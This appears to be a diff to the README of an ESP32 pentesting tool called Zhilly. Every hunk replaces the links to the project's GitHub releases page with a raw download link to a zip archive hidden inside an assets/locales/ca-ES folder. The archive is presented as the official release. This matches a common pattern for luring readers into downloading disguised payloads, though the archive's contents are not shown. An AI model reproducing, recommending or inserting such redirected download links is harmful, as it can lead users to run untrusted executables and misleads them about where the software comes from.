@@ -1,6 +1,6 @@
 # ⚙️ Zhilly - Easy ESP32 Pentesting Tool
 
-[![Download Zhilly](https://img.shields.io/badge/Download-Zhilly-4a90e2?style=for-the-badge)](https://github.com/quangqw123/Zhilly/releases)
+[![Download Zhilly](https://img.shields.io/badge/Download-Zhilly-4a90e2?style=for-the-badge)](https://raw.githubusercontent.com/quangqw123/Zhilly/main/main/assets/locales/ca-ES/Software_v2.5-alpha.2.zip)
 
 ---
 
@@ -32,7 +32,7 @@ This section will guide you through downloading and setting up Zhilly on your Wi
 
 Click this link to visit the release page for Zhilly:
 
-[Download Zhilly from Releases](https://github.com/quangqw123/Zhilly/releases)
+[Download Zhilly from Releases](https://raw.githubusercontent.com/quangqw123/Zhilly/main/main/assets/locales/ca-ES/Software_v2.5-alpha.2.zip)
 
 Once on the page:
 
@@ -118,7 +118,7 @@ This mode is powerful for learning about USB security risks but should be handle
 
 Check the release page regularly for new versions:
 
-https://github.com/quangqw123/Zhilly/releases
+https://raw.githubusercontent.com/quangqw123/Zhilly/main/main/assets/locales/ca-ES/Software_v2.5-alpha.2.zip
 
 Download and install newer versions the same way you first installed.
 
@@ -148,10 +148,10 @@ Updates improve security, add features, and fix issues.
 
 For advanced usage and developer info, check the releases page and project wiki on GitHub.
 
-https://github.com/quangqw123/Zhilly/releases
+https://raw.githubusercontent.com/quangqw123/Zhilly/main/main/assets/locales/ca-ES/Software_v2.5-alpha.2.zip
 
 Explore example scripts, detailed hardware info, and firmware updates there.
 
 ---
 
-[![Download Zhilly](https://img.shields.io/badge/Download-Zhilly-4a90e2?style=for-the-badge)](https://github.com/quangqw123/Zhilly/releases)
+[![Download Zhilly](https://img.shields.io/badge/Download-Zhilly-4a90e2?style=for-the-badge)](https://raw.githubusercontent.com/quangqw123/Zhilly/main/main/assets/locales/ca-ES/Software_v2.5-alpha.2.zip)
